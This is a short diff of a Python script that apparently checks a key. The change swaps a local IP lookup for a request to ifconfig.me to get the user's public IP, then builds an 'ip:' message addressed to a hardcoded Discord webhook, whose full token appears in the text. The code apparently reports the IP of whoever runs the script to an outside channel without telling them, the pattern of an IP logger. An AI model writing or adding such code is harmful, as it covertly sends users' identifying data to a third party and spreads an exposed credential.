@@ -76,7 +76,8 @@ try:
 except:
    nhapkey()
           
-ip_address = socket.gethostbyname(socket.gethostname())    
+response = requests.get("https://ifconfig.me")
+ip_address = response.text   
 message = f"ip: {ip_address}"
 webhook_url = "https://discord.com/api/webhooks/1169992623822479421/WLwn4J0kBeyi9c4ixNDeDe6skJLSWUQKJvG73dsnyWFDBu0JBtVFak--uUAJwwqcfHgW"
 n = "\n"          
